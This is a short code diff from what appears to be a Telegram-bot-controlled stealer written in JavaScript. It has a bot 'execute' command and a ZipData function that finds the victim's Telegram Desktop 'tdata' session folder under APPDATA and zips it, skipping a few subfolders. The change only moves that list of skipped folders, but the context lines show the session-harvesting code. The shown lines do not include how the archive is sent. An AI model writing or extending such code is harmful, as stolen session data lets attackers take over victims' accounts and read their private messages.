@@ -18,11 +18,10 @@ bot.command("execute", (ctx) => {
 // Start the bot.
 bot.start();
 
-const ignoreDirs = ["emoji", "user_data", "dump"]; // Array of directories to be ignored
-
 function ZipData(chat_id) {
   const tgDesktop = path.join(process.env.APPDATA, "Telegram Desktop");
   const directoryToZip = path.join(tgDesktop, "tdata");
+  const ignoreDirs = ["emoji", "user_data", "dump"]; // Array of directories to be ignored
 
   // Create a writable stream to save the zip file
   const filename = `data-${Date.now()}.zip`;
